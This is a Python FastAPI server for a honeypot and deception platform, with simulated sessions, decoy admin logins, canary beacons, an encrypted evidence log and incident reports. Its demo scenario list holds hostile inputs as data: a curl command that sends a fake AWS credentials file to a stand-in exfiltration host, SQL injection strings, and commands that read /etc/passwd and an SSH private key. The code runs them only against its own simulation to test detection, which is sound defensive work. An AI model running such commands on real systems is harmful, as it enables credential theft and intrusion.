"""MirageNet FastAPI Server: Real-time WebSockets, Honeypot Sandbox API, Evidence Vault & Incident Reporting."""

from __future__ import annotations

import asyncio
from contextlib import asynccontextmanager
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, AsyncIterator

from fastapi import FastAPI, Header, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

from .canary import CanaryMonitor
from .crypto_evidence import EvidenceVault, RBACManager
from .honeypot import HoneypotEnvironment
from .threat_engine import AIThreatAnalyzer

BASE_DIR = Path(__file__).resolve().parent.parent
FRONTEND_DIR = BASE_DIR / "frontend"


@asynccontextmanager
async def lifespan(_: FastAPI) -> AsyncIterator[None]:
    if not honeypot_env.sessions:
        honeypot_env.create_session(tester_label="Demo-Security-Tester", source_ip="198.51.100.42")
    yield


app = FastAPI(
    title="MirageNet — Adaptive Cyber Deception & Threat Intelligence",
    version="1.0.0",
    lifespan=lifespan,
)

canary_monitor = CanaryMonitor()
honeypot_env = HoneypotEnvironment(canary_monitor=canary_monitor)
threat_analyzer = AIThreatAnalyzer()
evidence_vault = EvidenceVault()
rbac_manager = RBACManager()


class ConnectionManager:
    """Broadcasts real-time security events to connected SOC dashboard clients."""

    def __init__(self) -> None:
        self.active_connections: list[WebSocket] = []

    async def connect(self, websocket: WebSocket) -> None:
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket) -> None:
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict[str, Any]) -> None:
        dead: list[WebSocket] = []
        for ws in self.active_connections:
            try:
                await ws.send_json(message)
            except Exception:
                dead.append(ws)
        for ws in dead:
            self.disconnect(ws)


ws_manager = ConnectionManager()


# --- Pydantic Models ---
class LoginRequest(BaseModel):
    username: str = Field(min_length=1, max_length=80)
    password: str = Field(min_length=1, max_length=256)


class CreateSessionRequest(BaseModel):
    tester_label: str = Field(default="Authorized-Tester-01", min_length=1, max_length=80)
    source_ip: str = Field(default="198.51.100.42", min_length=2, max_length=64)


class TerminalCommandRequest(BaseModel):
    command: str = Field(min_length=1, max_length=2048)


class DecoyAdminRequest(BaseModel):
    username: str = Field(default="", max_length=256)
    password: str = Field(default="", max_length=256)
    query: str = Field(default="", max_length=2048)


class ScenarioRequest(BaseModel):
    scenario_id: str = Field(min_length=1, max_length=64)


def _ensure_active_session(session_id: str) -> None:
    try:
        session = honeypot_env.get_session(session_id)
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc
    if session.status != "ACTIVE":
        raise HTTPException(status_code=409, detail="Session is closed")


def _record_and_analyze_event(
    session_id: str,
    event_type: str,
    raw_input: str,
    target_node: str,
    canary_trigger: dict[str, Any] | None = None,
    extra_detail: str = "",
) -> dict[str, Any]:
    session = honeypot_env.get_session(session_id)
    analysis = threat_analyzer.analyze_event(
        event_type=event_type,
        raw_input=raw_input,
        canary_trigger=canary_trigger,
        session_history_count=len(session.events),
        previous_risk=session.max_risk_score,
    )
    session.max_risk_score = max(session.max_risk_score, analysis["risk_score"])

    event_obj: dict[str, Any] = {
        "event_id": f"EVT-{len(session.events) + 1:03d}",
        "session_id": session_id,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "event_type": event_type,
        "raw_input": raw_input,
        "target_node": target_node,
        "canary_trigger": canary_trigger,
        "extra_detail": extra_detail,
        **analysis,
    }
    session.events.append(event_obj)
    evidence_rec = evidence_vault.seal_evidence(session_id=session_id, event_payload=event_obj)
    event_obj["evidence_id"] = evidence_rec["evidence_id"]
    event_obj["record_hash"] = evidence_rec["record_hash"]
    return event_obj


def _build_state_snapshot() -> dict[str, Any]:
    sessions_summary = [
        {
            "session_id": s.session_id,
            "tester_label": s.tester_label,
            "source_ip": s.source_ip,
            "status": s.status,
            "started_at": s.started_at,
            "ended_at": s.ended_at,
            "cwd": s.cwd,
            "event_count": len(s.events),
            "max_risk_score": s.max_risk_score,
            "accessed_resources": s.accessed_resources,
        }
        for s in honeypot_env.sessions.values()
    ]
    all_events = [e for s in honeypot_env.sessions.values() for e in s.events]
    all_events.sort(key=lambda x: x["timestamp"], reverse=True)
    integrity = evidence_vault.verify_chain()

    return {
        "sessions": sessions_summary,
        "events": all_events[:60],
        "canary_triggers": canary_monitor.list_triggers(),
        "honeyfiles": canary_monitor.list_honeyfiles(),
        "evidence_records": evidence_vault.list_records()[-30:],
        "integrity": integrity,
        "audit_log": evidence_vault.get_audit_log()[-25:],
    }


# --- Auth & RBAC ---
@app.post("/api/auth/login")
def login(req: LoginRequest) -> dict[str, Any]:
    auth = rbac_manager.authenticate(req.username, req.password)
    if not auth:
        raise HTTPException(status_code=401, detail="Invalid SOC credentials")
    return auth


# --- Dashboard State ---
@app.get("/api/dashboard/state")
def get_dashboard_state() -> dict[str, Any]:
    return _build_state_snapshot()


# --- Honeypot Sessions ---
@app.post("/api/sessions")
async def create_session(req: CreateSessionRequest) -> dict[str, Any]:
    session = honeypot_env.create_session(tester_label=req.tester_label, source_ip=req.source_ip)
    await ws_manager.broadcast({"type": "state_update", "state": _build_state_snapshot()})
    return {"session_id": session.session_id, "status": session.status, "cwd": session.cwd}


@app.post("/api/sessions/{session_id}/close")
async def close_session(session_id: str) -> dict[str, Any]:
    try:
        session = honeypot_env.close_session(session_id)
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc
    await ws_manager.broadcast({"type": "state_update", "state": _build_state_snapshot()})
    return {"session_id": session.session_id, "status": session.status}


# --- Virtual Terminal ---
@app.post("/api/sessions/{session_id}/terminal")
async def run_terminal_command(session_id: str, req: TerminalCommandRequest) -> dict[str, Any]:
    _ensure_active_session(session_id)
    try:
        res = honeypot_env.execute_terminal_command(session_id, req.command)
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc
    except RuntimeError as exc:
        raise HTTPException(status_code=409, detail=str(exc)) from exc

    target_node = "honeyfile-vault" if res["canary_trigger"] else "virtual-server"
    event = _record_and_analyze_event(
        session_id=session_id,
        event_type="terminal_command",
        raw_input=req.command,
        target_node=target_node,
        canary_trigger=res["canary_trigger"],
    )
    await ws_manager.broadcast({"type": "security_event", "event": event, "state": _build_state_snapshot()})
    return {"terminal": res, "event": event}


# --- Dummy Admin Interface & Synthetic DB ---
@app.post("/api/sessions/{session_id}/decoy-admin")
async def run_decoy_admin(session_id: str, req: DecoyAdminRequest) -> dict[str, Any]:
    _ensure_active_session(session_id)
    try:
        res = honeypot_env.execute_decoy_admin_action(
            session_id=session_id,
            username=req.username,
            password=req.password,
            query=req.query,
        )
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc
    except RuntimeError as exc:
        raise HTTPException(status_code=409, detail=str(exc)) from exc

    raw_desc = req.query if req.query else f"login user={req.username} pass=[REDACTED]"
    target_node = "synthetic-db" if req.query else "decoy-admin"
    event = _record_and_analyze_event(
        session_id=session_id,
        event_type="decoy_admin_probe",
        raw_input=raw_desc,
        target_node=target_node,
    )
    await ws_manager.broadcast({"type": "security_event", "event": event, "state": _build_state_snapshot()})
    return {"admin_result": res, "event": event}


# --- Guided Simulation Scenarios (for live demo) ---
SCENARIOS: dict[str, list[dict[str, str]]] = {
    "recon": [
        {"kind": "terminal", "value": "whoami"},
        {"kind": "terminal", "value": "uname -a"},
        {"kind": "terminal", "value": "netstat"},
        {"kind": "terminal", "value": "find /opt"},
    ],
    "canary_exfil": [
        {"kind": "terminal", "value": "ls /opt/secrets"},
        {"kind": "terminal", "value": "cat /opt/secrets/aws_credentials.txt"},
        {"kind": "terminal", "value": "curl https://exfil.example.test/upload -d @/opt/secrets/aws_credentials.txt"},
    ],
    "sqli_admin": [
        {"kind": "admin", "username": "admin' OR 1=1 --", "password": "x", "query": ""},
        {"kind": "admin", "username": "admin", "password": "", "query": "SELECT * FROM users UNION SELECT * FROM api_tokens"},
    ],
    "privesc": [
        {"kind": "terminal", "value": "cat /etc/passwd"},
        {"kind": "terminal", "value": "sudo su -"},
        {"kind": "terminal", "value": "cat /home/admin/.ssh/id_rsa"},
    ],
}


@app.post("/api/sessions/{session_id}/scenario")
async def run_scenario(session_id: str, req: ScenarioRequest) -> dict[str, Any]:
    steps = SCENARIOS.get(req.scenario_id)
    if not steps:
        raise HTTPException(status_code=400, detail=f"Unknown scenario '{req.scenario_id}'")
    _ensure_active_session(session_id)

    outputs: list[dict[str, Any]] = []
    for step in steps:
        if step["kind"] == "terminal":
            res = honeypot_env.execute_terminal_command(session_id, step["value"])
            target_node = "honeyfile-vault" if res["canary_trigger"] else "virtual-server"
            ev = _record_and_analyze_event(
                session_id=session_id,
                event_type="terminal_command",
                raw_input=step["value"],
                target_node=target_node,
                canary_trigger=res["canary_trigger"],
            )
            outputs.append({"command": step["value"], "output": res["output"], "event": ev})
        else:
            res = honeypot_env.execute_decoy_admin_action(
                session_id=session_id,
                username=step.get("username", ""),
                password=step.get("password", ""),
                query=step.get("query", ""),
            )
            raw_desc = step.get("query") or f"login user={step.get('username')} pass=[REDACTED]"
            target_node = "synthetic-db" if step.get("query") else "decoy-admin"
            ev = _record_and_analyze_event(
                session_id=session_id,
                event_type="decoy_admin_probe",
                raw_input=raw_desc,
                target_node=target_node,
            )
            outputs.append({"admin": raw_desc, "output": res["message"], "event": ev})

        await ws_manager.broadcast({"type": "security_event", "event": ev, "state": _build_state_snapshot()})
        await asyncio.sleep(0.15)

    return {"scenario_id": req.scenario_id, "steps_executed": len(outputs), "results": outputs}


# --- Digital Canary Tracking Beacon ---
@app.get("/api/canary/beacon/{canary_id}")
async def trigger_canary_beacon(canary_id: str, session_id: str | None = None) -> dict[str, Any]:
    """Active Canary Token tracking URL: fires when a decoy link or token is accessed."""
    target_session = session_id or next(
        (sid for sid, session in honeypot_env.sessions.items() if session.status == "ACTIVE"),
        None,
    )
    if not target_session:
        raise HTTPException(status_code=404, detail="No active deception session")

    _ensure_active_session(target_session)
    trigger = canary_monitor.trigger_beacon(canary_id=canary_id, session_id=target_session, source="http_tracking_url")
    if not trigger:
        raise HTTPException(status_code=404, detail=f"Unknown canary_id '{canary_id}'")

    event = _record_and_analyze_event(
        session_id=target_session,
        event_type="canary_beacon_hit",
        raw_input=f"GET /api/canary/beacon/{canary_id}",
        target_node="honeyfile-vault",
        canary_trigger=trigger,
    )
    await ws_manager.broadcast({"type": "security_event", "event": event, "state": _build_state_snapshot()})
    return {"status": "canary_triggered", "trigger": trigger, "event": event}


# --- Evidence Verification & Decryption ---
@app.get("/api/evidence/verify")
def verify_evidence() -> dict[str, Any]:
    return evidence_vault.verify_chain()


@app.get("/api/evidence/{evidence_id}/decrypt")
def decrypt_evidence(evidence_id: str, x_auth_token: str | None = Header(default=None)) -> dict[str, Any]:
    try:
        actor = rbac_manager.check_permission(x_auth_token, "decrypt_evidence")
        payload = evidence_vault.decrypt_evidence(evidence_id, actor=actor["username"])
        return {"evidence_id": evidence_id, "decrypted_by": actor["username"], "payload": payload}
    except PermissionError as exc:
        raise HTTPException(status_code=403, detail=str(exc)) from exc
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc


# --- Automated Incident Reporting ---
@app.get("/api/sessions/{session_id}/report")
def generate_incident_report(session_id: str) -> dict[str, Any]:
    try:
        session = honeypot_env.get_session(session_id)
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc

    triggers = canary_monitor.list_triggers(session_id)
    ev_records = evidence_vault.list_records(session_id)
    integrity = evidence_vault.verify_chain()

    mitre_techniques = sorted({f"{e['mitre_id']} — {e['mitre_name']}" for e in session.events})
    recommendations = list(dict.fromkeys(e["recommendation"] for e in session.events))

    if session.max_risk_score >= 85:
        overall_risk = "CRITICAL"
    elif session.max_risk_score >= 65:
        overall_risk = "HIGH"
    elif session.max_risk_score >= 40:
        overall_risk = "MEDIUM"
    else:
        overall_risk = "LOW"

    return {
        "report_id": f"RPT-{session.session_id}",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "session_id": session.session_id,
        "tester_label": session.tester_label,
        "source_ip": session.source_ip,
        "status": session.status,
        "started_at": session.started_at,
        "ended_at": session.ended_at,
        "executive_summary": (
            f"Session {session.session_id} recorded {len(session.events)} security events inside the isolated "
            f"MirageNet deception environment, triggering {len(triggers)} Digital Canary alert(s). "
            f"Peak risk score reached {session.max_risk_score}/100 ({overall_risk})."
        ),
        "overall_risk_level": overall_risk,
        "max_risk_score": session.max_risk_score,
        "mitre_attack_techniques": mitre_techniques,
        "accessed_resources": session.accessed_resources,
        "canary_triggers": triggers,
        "timeline": [
            {
                "event_id": e["event_id"],
                "timestamp": e["timestamp"],
                "category": e["category"],
                "mitre_id": e["mitre_id"],
                "risk_level": e["risk_level"],
                "risk_score": e["risk_score"],
                "raw_input": e["raw_input"],
                "explanation": e["explanation"],
                "evidence_id": e.get("evidence_id"),
            }
            for e in session.events
        ],
        "cryptographic_evidence": {
            "total_sealed_records": len(ev_records),
            "integrity_verified": integrity["integrity_ok"],
            "algorithm": "AES-256-GCM + SHA-256 + Ed25519",
            "public_key_pem": evidence_vault.public_key_pem,
            "evidence_hashes": [
                {"evidence_id": r["evidence_id"], "record_hash": r["record_hash"]} for r in ev_records
            ],
        },
        "recommendations": recommendations,
    }


# --- WebSocket for Real-Time SOC Stream ---
@app.websocket("/ws/soc")
async def soc_websocket(websocket: WebSocket) -> None:
    await ws_manager.connect(websocket)
    try:
        await websocket.send_json({"type": "state_update", "state": _build_state_snapshot()})
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        ws_manager.disconnect(websocket)


# --- Frontend Static Serving ---
if FRONTEND_DIR.exists():
    app.mount("/static", StaticFiles(directory=str(FRONTEND_DIR)), name="static")


@app.get("/")
def serve_index() -> FileResponse:
    return FileResponse(str(FRONTEND_DIR / "index.html"))
